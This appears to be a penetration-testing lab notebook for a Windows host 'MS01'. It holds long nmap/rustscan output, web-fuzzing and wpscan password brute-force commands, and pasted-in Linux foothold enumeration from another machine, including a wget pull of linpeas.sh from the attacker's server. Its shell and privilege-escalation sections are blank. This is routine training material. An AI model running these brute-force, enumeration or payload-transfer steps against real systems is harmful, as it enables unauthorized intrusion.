##### Machine Information
```markdown
IP ADDRESS: 192.168.118.101

HN: MS01

OS: Windows 10.0 Build 19041 x64

EXPLOIT/PORT:

PRIVESC: 

USERS MENTIONED:

CREDENTIALS:
```

------------------------------------------------------------------------------------
###### Initial Scanning  
#ping
```shell
#ping 
┌──(root㉿kali)-[/home/kali]
└─# ping 192.168.118.101
PING 192.168.118.101 (192.168.118.101) 56(84) bytes of data.
64 bytes from 192.168.118.101: icmp_seq=1 ttl=127 time=51.4 ms
64 bytes from 192.168.118.101: icmp_seq=2 ttl=127 time=51.3 ms
^C
--- 192.168.118.101 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 51.269/51.311/51.354/0.042 ms
       

```
#rustscan 
```shell
┌──(root㉿kali)-[/home/kali]
└─# rustscan -a 192.168.118.101
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.118.101:80
Open 192.168.118.101:135
Open 192.168.118.101:139
Open 192.168.118.101:445
Open 192.168.118.101:8672
Open 192.168.118.101:9099
Open 192.168.118.101:9443
Open 192.168.118.101:9611
Open 192.168.118.101:9711
Open 192.168.118.101:9763
Open 192.168.118.101:9999
Open 192.168.118.101:19150
Open 192.168.118.101:49669
Open 192.168.118.101:49668
Open 192.168.118.101:49667
Open 192.168.118.101:49665
Open 192.168.118.101:49666
Open 192.168.118.101:49664
Open 192.168.118.101:49671
Open 192.168.118.101:49672
Open 192.168.118.101:65469
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 08:55 EDT
Initiating Ping Scan at 08:55
Scanning 192.168.118.101 [4 ports]
Completed Ping Scan at 08:55, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:55
Completed Parallel DNS resolution of 1 host. at 08:55, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 08:55
Scanning 192.168.118.101 [21 ports]
Discovered open port 135/tcp on 192.168.118.101
Discovered open port 445/tcp on 192.168.118.101
Discovered open port 139/tcp on 192.168.118.101
Discovered open port 80/tcp on 192.168.118.101
Discovered open port 49671/tcp on 192.168.118.101
Discovered open port 49672/tcp on 192.168.118.101
Discovered open port 65469/tcp on 192.168.118.101
Discovered open port 49667/tcp on 192.168.118.101
Discovered open port 49668/tcp on 192.168.118.101
Discovered open port 9711/tcp on 192.168.118.101
Discovered open port 49669/tcp on 192.168.118.101
Discovered open port 49664/tcp on 192.168.118.101
Discovered open port 49666/tcp on 192.168.118.101
Discovered open port 8672/tcp on 192.168.118.101
Discovered open port 9999/tcp on 192.168.118.101
Discovered open port 49665/tcp on 192.168.118.101
Discovered open port 9611/tcp on 192.168.118.101
Discovered open port 9099/tcp on 192.168.118.101
Discovered open port 19150/tcp on 192.168.118.101
Discovered open port 9763/tcp on 192.168.118.101
Discovered open port 9443/tcp on 192.168.118.101
Completed SYN Stealth Scan at 08:55, 0.14s elapsed (21 total ports)
Nmap scan report for 192.168.118.101
Host is up, received echo-reply ttl 127 (0.049s latency).
Scanned at 2023-04-12 08:55:01 EDT for 0s

PORT      STATE SERVICE        REASON
80/tcp    open  http           syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
8672/tcp  open  unknown        syn-ack ttl 127
9099/tcp  open  unknown        syn-ack ttl 127
9443/tcp  open  tungsten-https syn-ack ttl 127
9611/tcp  open  unknown        syn-ack ttl 127
9711/tcp  open  unknown        syn-ack ttl 127
9763/tcp  open  unknown        syn-ack ttl 127
9999/tcp  open  abyss          syn-ack ttl 127
19150/tcp open  gkrellm        syn-ack ttl 127
49664/tcp open  unknown        syn-ack ttl 127
49665/tcp open  unknown        syn-ack ttl 127
49666/tcp open  unknown        syn-ack ttl 127
49667/tcp open  unknown        syn-ack ttl 127
49668/tcp open  unknown        syn-ack ttl 127
49669/tcp open  unknown        syn-ack ttl 127
49671/tcp open  unknown        syn-ack ttl 127
49672/tcp open  unknown        syn-ack ttl 127
65469/tcp open  unknown        syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
           Raw packets sent: 25 (1.076KB) | Rcvd: 22 (952B)

```
#quick #nmap #for #rustscan
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p 80,135,139,445,8672,9099,9443,9611,9711,9763,9999,11111,19150,49669,49668,49667,49665,49666,49664,49671,49672,65469 192.168.118.101
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 09:00 EDT
Stats: 0:05:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.16% done; ETC: 09:05 (0:00:02 remaining)
Stats: 0:05:48 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.16% done; ETC: 09:06 (0:00:03 remaining)
Nmap scan report for 192.168.118.101
Host is up (0.050s latency).

PORT      STATE SERVICE             VERSION
80/tcp    open  http                Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8672/tcp  open  unknown
9099/tcp  open  unknown
9443/tcp  open  ssl/tungsten-https?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, RPCCheck: 
|     HTTP/1.1 400 
|     Content-Length: 0
|     Date: Wed, 14 Sep 2022 23:56:04 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   HTTPOptions: 
|     HTTP/1.1 302 
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Set-Cookie: JSESSIONID=FD2B9696A2699B646D8D110E6FA3DD14; Path=/; Secure; HttpOnly
|     Location: https://ms01.oscp.exam:9443/publisher/
|     Content-Length: 0
|     Date: Wed, 14 Sep 2022 23:56:03 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   Help, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 
|     Content-Length: 0
|     Date: Wed, 14 Sep 2022 23:56:05 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   Kerberos: 
|     HTTP/1.1 400 
|     Content-Length: 0
|     Date: Wed, 14 Sep 2022 23:56:06 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Length: 0
|     Date: Wed, 14 Sep 2022 23:56:04 GMT
|_    Server: WSO2 Carbon Server
9611/tcp  open  unknown
9711/tcp  open  ssl/unknown
9763/tcp  open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 
|     Content-Length: 0
|     Date: Wed, 14 Sep 2022 23:56:01 GMT
|     Connection: close
|     Server: WSO2 Carbon Server
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Length: 0
|     Date: Wed, 14 Sep 2022 23:56:01 GMT
|     Server: WSO2 Carbon Server
|   SMBProgNeg, X11Probe: 
|     HTTP/1.1 400 
|     Content-Length: 0
|     Date: Wed, 14 Sep 2022 23:56:02 GMT
|     Connection: close
|_    Server: WSO2 Carbon Server
9999/tcp  open  java-rmi            Java RMI
11111/tcp open  java-rmi            Java RMI
19150/tcp open  ssl/gkrellm?
| ssl-cert: Subject: commonName=RemoteSystemMonitor
| Not valid before: 2022-05-28T17:36:08
|_Not valid after:  2222-05-28T17:36:08
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     a703826b02f24616be5e9e165f2893c8 
|     81314d1872ff45ca92839ec924e4c010
|   DNSVersionBindReqTCP: 
|     a703826b02f24616be5e9e165f2893c8 
|     b4f8899542e54adfab2a2e6fee1134bf
|   FourOhFourRequest: 
|     a703826b02f24616be5e9e165f2893c8 
|     71a540268b9f4deebd9d45b7d863c2be
|   GenericLines, NULL: 
|     a703826b02f24616be5e9e165f2893c8 
|     6a1832e288324639823f16605f40403b
|   GetRequest: 
|     a703826b02f24616be5e9e165f2893c8 
|     ecbd4c75bb3f4d03b13cb8623a111bfd
|   HTTPOptions: 
|     a703826b02f24616be5e9e165f2893c8 
|     914033239b2a45dea4370cc392719082
|   Help: 
|     a703826b02f24616be5e9e165f2893c8 
|     63c0d06d213642ec867f722cda4e91a0
|   Kerberos: 
|     a703826b02f24616be5e9e165f2893c8 
|     8b3d26abb0cd45d186869c7049ac87c0
|   LDAPSearchReq: 
|     a703826b02f24616be5e9e165f2893c8 
|     15d5b1bd727d4fa283ebb3b3dfdcb455
|   LPDString: 
|     a703826b02f24616be5e9e165f2893c8 
|     195c100ac8604f978393030a74f10761
|   RPCCheck: 
|     a703826b02f24616be5e9e165f2893c8 
|     b434527d5d994de5b208eb88b1105f3e
|   RTSPRequest: 
|     a703826b02f24616be5e9e165f2893c8 
|     3fa05546972d478da734d11481574086
|   SMBProgNeg: 
|     a703826b02f24616be5e9e165f2893c8 
|     eb6a928669574c2ab44cb934101fbec9
|   SSLSessionReq: 
|     a703826b02f24616be5e9e165f2893c8 
|     de4f5539c3ac4b8fb7bb66ce3fb6c3b0
|   TLSSessionReq: 
|     a703826b02f24616be5e9e165f2893c8 
|     456bfd8fc92449f981abda4b33883e9b
|   TerminalServerCookie: 
|     a703826b02f24616be5e9e165f2893c8 
|     66b10ed779e44e72a36bda11fa80d748
|   X11Probe: 
|     a703826b02f24616be5e9e165f2893c8 
|_    da0ceacda67f444a89f5deca13ace372
49664/tcp open  msrpc               Microsoft Windows RPC
49665/tcp open  msrpc               Microsoft Windows RPC
49666/tcp open  msrpc               Microsoft Windows RPC
49667/tcp open  msrpc               Microsoft Windows RPC
49668/tcp open  msrpc               Microsoft Windows RPC
49669/tcp open  msrpc               Microsoft Windows RPC
49671/tcp open  msrpc               Microsoft Windows RPC
49672/tcp open  msrpc               Microsoft Windows RPC
65469/tcp open  tcpwrapped
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9443-TCP:V=7.93%T=SSL%I=7%D=4/12%Time=6436AB80%P=x86_64-pc-linux-gn
SF:u%r(HTTPOptions,13F,"HTTP/1\.1\x20302\x20\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nSet-Cookie:\x20JSE
SF:SSIONID=FD2B9696A2699B646D8D110E6FA3DD14;\x20Path=/;\x20Secure;\x20Http
SF:Only\r\nLocation:\x20https://ms01\.oscp\.exam:9443/publisher/\r\nConten
SF:t-Length:\x200\r\nDate:\x20Wed,\x2014\x20Sep\x202022\x2023:56:03\x20GMT
SF:\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n
SF:")%r(RTSPRequest,65,"HTTP/1\.1\x20505\x20\r\nContent-Length:\x200\r\nDa
SF:te:\x20Wed,\x2014\x20Sep\x202022\x2023:56:04\x20GMT\r\nServer:\x20WSO2\
SF:x20Carbon\x20Server\r\n\r\n")%r(RPCCheck,78,"HTTP/1\.1\x20400\x20\r\nCo
SF:ntent-Length:\x200\r\nDate:\x20Wed,\x2014\x20Sep\x202022\x2023:56:04\x2
SF:0GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n
SF:\r\n")%r(DNSVersionBindReqTCP,78,"HTTP/1\.1\x20400\x20\r\nContent-Lengt
SF:h:\x200\r\nDate:\x20Wed,\x2014\x20Sep\x202022\x2023:56:04\x20GMT\r\nCon
SF:nection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(DN
SF:SStatusRequestTCP,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x200\r\nD
SF:ate:\x20Wed,\x2014\x20Sep\x202022\x2023:56:04\x20GMT\r\nConnection:\x20
SF:close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(Help,78,"HTTP/
SF:1\.1\x20400\x20\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2014\x20Sep\x
SF:202022\x2023:56:05\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x2
SF:0Carbon\x20Server\r\n\r\n")%r(SSLSessionReq,78,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Length:\x200\r\nDate:\x20Wed,\x2014\x20Sep\x202022\x2023:56:05
SF:\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\
SF:r\n\r\n")%r(TerminalServerCookie,78,"HTTP/1\.1\x20400\x20\r\nContent-Le
SF:ngth:\x200\r\nDate:\x20Wed,\x2014\x20Sep\x202022\x2023:56:05\x20GMT\r\n
SF:Connection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r
SF:(TLSSessionReq,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x200\r\nDate
SF::\x20Wed,\x2014\x20Sep\x202022\x2023:56:05\x20GMT\r\nConnection:\x20clo
SF:se\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(Kerberos,78,"HTTP
SF:/1\.1\x20400\x20\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2014\x20Sep\
SF:x202022\x2023:56:06\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x
SF:20Carbon\x20Server\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9763-TCP:V=7.93%I=7%D=4/12%Time=6436AB7D%P=x86_64-pc-linux-gnu%r(RT
SF:SPRequest,65,"HTTP/1\.1\x20505\x20\r\nContent-Length:\x200\r\nDate:\x20
SF:Wed,\x2014\x20Sep\x202022\x2023:56:01\x20GMT\r\nServer:\x20WSO2\x20Carb
SF:on\x20Server\r\n\r\n")%r(RPCCheck,78,"HTTP/1\.1\x20400\x20\r\nContent-L
SF:ength:\x200\r\nDate:\x20Wed,\x2014\x20Sep\x202022\x2023:56:01\x20GMT\r\
SF:nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%
SF:r(DNSVersionBindReqTCP,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x200
SF:\r\nDate:\x20Wed,\x2014\x20Sep\x202022\x2023:56:01\x20GMT\r\nConnection
SF::\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(DNSStatus
SF:RequestTCP,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x200\r\nDate:\x2
SF:0Wed,\x2014\x20Sep\x202022\x2023:56:01\x20GMT\r\nConnection:\x20close\r
SF:\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(Help,78,"HTTP/1\.1\x2
SF:0400\x20\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2014\x20Sep\x202022\
SF:x2023:56:01\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon
SF:\x20Server\r\n\r\n")%r(SSLSessionReq,78,"HTTP/1\.1\x20400\x20\r\nConten
SF:t-Length:\x200\r\nDate:\x20Wed,\x2014\x20Sep\x202022\x2023:56:01\x20GMT
SF:\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n
SF:")%r(TerminalServerCookie,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x
SF:200\r\nDate:\x20Wed,\x2014\x20Sep\x202022\x2023:56:01\x20GMT\r\nConnect
SF:ion:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(TLSSes
SF:sionReq,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x200\r\nDate:\x20We
SF:d,\x2014\x20Sep\x202022\x2023:56:01\x20GMT\r\nConnection:\x20close\r\nS
SF:erver:\x20WSO2\x20Carbon\x20Server\r\n\r\n")%r(Kerberos,78,"HTTP/1\.1\x
SF:20400\x20\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2014\x20Sep\x202022
SF:\x2023:56:01\x20GMT\r\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbo
SF:n\x20Server\r\n\r\n")%r(SMBProgNeg,78,"HTTP/1\.1\x20400\x20\r\nContent-
SF:Length:\x200\r\nDate:\x20Wed,\x2014\x20Sep\x202022\x2023:56:02\x20GMT\r
SF:\nConnection:\x20close\r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n")
SF:%r(X11Probe,78,"HTTP/1\.1\x20400\x20\r\nContent-Length:\x200\r\nDate:\x
SF:20Wed,\x2014\x20Sep\x202022\x2023:56:02\x20GMT\r\nConnection:\x20close\
SF:r\nServer:\x20WSO2\x20Carbon\x20Server\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port19150-TCP:V=7.93%T=SSL%I=7%D=4/12%Time=6436AB8B%P=x86_64-pc-linux-g
SF:nu%r(NULL,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0
SF:\0\x006a1832e288324639823f16605f40403b")%r(GenericLines,4C,"4\x01\0\0\x
SF:20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\x006a1832e288324639823
SF:f16605f40403b")%r(GetRequest,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5
SF:e9e165f2893c8\x20\0\0\0ecbd4c75bb3f4d03b13cb8623a111bfd")%r(HTTPOptions
SF:,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\x00914
SF:033239b2a45dea4370cc392719082")%r(RTSPRequest,4C,"4\x01\0\0\x20\0\0\0a7
SF:03826b02f24616be5e9e165f2893c8\x20\0\0\x003fa05546972d478da734d11481574
SF:086")%r(RPCCheck,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c
SF:8\x20\0\0\0b434527d5d994de5b208eb88b1105f3e")%r(DNSVersionBindReqTCP,4C
SF:,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\0b4f88995
SF:42e54adfab2a2e6fee1134bf")%r(DNSStatusRequestTCP,4C,"4\x01\0\0\x20\0\0\
SF:0a703826b02f24616be5e9e165f2893c8\x20\0\0\x0081314d1872ff45ca92839ec924
SF:e4c010")%r(Help,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8
SF:\x20\0\0\x0063c0d06d213642ec867f722cda4e91a0")%r(SSLSessionReq,4C,"4\x0
SF:1\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\0de4f5539c3ac4b
SF:8fb7bb66ce3fb6c3b0")%r(TerminalServerCookie,4C,"4\x01\0\0\x20\0\0\0a703
SF:826b02f24616be5e9e165f2893c8\x20\0\0\x0066b10ed779e44e72a36bda11fa80d74
SF:8")%r(TLSSessionReq,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f28
SF:93c8\x20\0\0\x00456bfd8fc92449f981abda4b33883e9b")%r(Kerberos,4C,"4\x01
SF:\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\x008b3d26abb0cd4
SF:5d186869c7049ac87c0")%r(SMBProgNeg,4C,"4\x01\0\0\x20\0\0\0a703826b02f24
SF:616be5e9e165f2893c8\x20\0\0\0eb6a928669574c2ab44cb934101fbec9")%r(X11Pr
SF:obe,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\0da
SF:0ceacda67f444a89f5deca13ace372")%r(FourOhFourRequest,4C,"4\x01\0\0\x20\
SF:0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\x0071a540268b9f4deebd9d45
SF:b7d863c2be")%r(LPDString,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e1
SF:65f2893c8\x20\0\0\x00195c100ac8604f978393030a74f10761")%r(LDAPSearchReq
SF:,4C,"4\x01\0\0\x20\0\0\0a703826b02f24616be5e9e165f2893c8\x20\0\0\x0015d
SF:5b1bd727d4fa283ebb3b3dfdcb455");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-14T23:58:59
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: -209d13h04m45s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 500.28 seconds

```

#2nd #rustscan 

```shell

PORT      STATE SERVICE        REASON
80/tcp    open  http           syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
5040/tcp  open  unknown        syn-ack ttl 127
5672/tcp  open  amqp           syn-ack ttl 127
7680/tcp  open  pando-pub      syn-ack ttl 127
8099/tcp  open  unknown        syn-ack ttl 127
8243/tcp  open  synapse-nhttps syn-ack ttl 127
8280/tcp  open  synapse-nhttp  syn-ack ttl 127
8672/tcp  open  unknown        syn-ack ttl 127
9099/tcp  open  unknown        syn-ack ttl 127
9443/tcp  open  tungsten-https syn-ack ttl 127
9611/tcp  open  unknown        syn-ack ttl 127
9711/tcp  open  unknown        syn-ack ttl 127
9763/tcp  open  unknown        syn-ack ttl 127
9999/tcp  open  abyss          syn-ack ttl 127
11111/tcp open  vce            syn-ack ttl 127
19150/tcp open  gkrellm        syn-ack ttl 127
49664/tcp open  unknown        syn-ack ttl 127
49665/tcp open  unknown        syn-ack ttl 127
49666/tcp open  unknown        syn-ack ttl 127
49667/tcp open  unknown        syn-ack ttl 127
49668/tcp open  unknown        syn-ack ttl 127
49669/tcp open  unknown        syn-ack ttl 127
49671/tcp open  unknown        syn-ack ttl 127
49672/tcp open  unknown        syn-ack ttl 127
65469/tcp open  unknown        syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
           Raw packets sent: 32 (1.384KB) | Rcvd: 52 (3.365KB)


```

#nmapudp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sU 10.11.1.101                            
```
#nmap #-pn
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -Pn 192.168.118.101
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 08:54 EDT
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 08:54 (0:00:12 remaining)
Nmap scan report for 192.168.118.101
Host is up (0.051s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8099/tcp  open  ssl/unknown
| ssl-cert: Subject: commonName=localhost/organizationName=WSO2/stateOrProvinceName=CA/countryName=US
| Subject Alternative Name: DNS:localhost
| Not valid before: 2019-10-23T07:30:43
|_Not valid after:  2022-01-25T07:30:43
|_ssl-date: TLS randomness does not represent time
9099/tcp  open  unknown
9999/tcp  open  java-rmi      Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @192.168.51.101:11111
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
11111/tcp open  java-rmi      Java RMI
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -209d13h04m44s
| smb2-time: 
|   date: 2022-09-14T23:51:15
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.30 seconds

```
#nmapfulltcp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p- -Pn 10.11.1.101
```
##### Initial Scanning Notes:
#initial #scanning #notes
- NOTES
- NOTES
- NOTES
  
##### Searchsploit Notes:
#searchsploit
- NOTES
- NOTES
- NOTES

##### Web Fuzzing : Dirsearch // GoBuster // ffuf // nikto
#gobuster #/usr/share/dirb/wordlists/common
```shell
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.118.101:80 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
```
#gobuster #bruteforce
```

gobuster dir -u http://192.168.111.110 -w
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -t 250 -o
wordpress_gobuster
```
#dirsearch #/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```shell
#dirsearch medium.txt
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://10.11.1.101:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```shell
# tcm recommended dirsearch
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -e php,html,js,asp,aspx -u http://10.11.1.234:10443 -x 400,401,403,500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#nikto #-a
```shell
┌──(root㉿kali)-[/home/kali]
└─# nikto -host 10.11.1.101:80  
```

#basic #ffuf
```shell
# basic ffuf scan - hail mary if nothing is found.
┌──(root㉿kali)-[/home/kali]
└─# ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://10.10.110.21/FUZZ
```

#wpscan #wordpress #plugin #reverse #shell #bruteforce #admin/princess #credentials
```shell
# Basic wpscan
┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.11.1.234:80

# WPscan bruteforce - reference 10.11.1.234 
┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.11.1.234:80/ --enumerate u,p,t -P rockyou.txt
```

Fuzzing notes:
- make sure if having issues to fuzzing to use all wordlists on kali machina and download seclists worst case scenario

##### Reverse Shell / Shell 

```shell
```

##### Foothold Enumeration Linux
#sudo #failed 
```shell
alfred@break:~/usr/bin$ sudo -l
[sudo] password for alfred: 
Sorry, user alfred may not run sudo on break.
alfred@break:~/usr/bin$ 
```
#cat #/etc/crontab
```shell
alfred@break:~/usr/bin$ cat /etc/crontab
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly 
```
#uname #-a #kernelprivesc
```shell
alfred@break:~$ uname -a
Linux break 4.4.0-166-generic #195-Ubuntu SMP Tue Oct 1 09:35:25 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
#cat #/etc*/release
```shell
alfred@break:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```
#lsb_release #-a 
```shell
alfred@break:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial
alfred@break:~$ 
```
#transfered #linpeas
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# ls               
linpeas.sh
                                                                          
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.11.1.101 - - [31/Mar/2023 19:51:13] "GET /linpeas.sh HTTP/1.1" 200 -

# pulled over linpeas
alfred@break:/tmp$ wget http://192.168.119.132/linpeas.sh
linpeas.sh                    100%[==============================================>] 808.68K  1.30MB/s    in 0.6s 
```
##### Foothold Enumeration Windows

```SHELL
```
##### Privilege Escalation
```shell
```

##### Flag
```powershell
```


###### Lessons Learned:


#ssh #portforwarding
```

In order to access the internal VNC port 5901, an SSH tunnel will need to be established
that will forward traffic from 5901 on Kali to the internal 5901 on the victim.
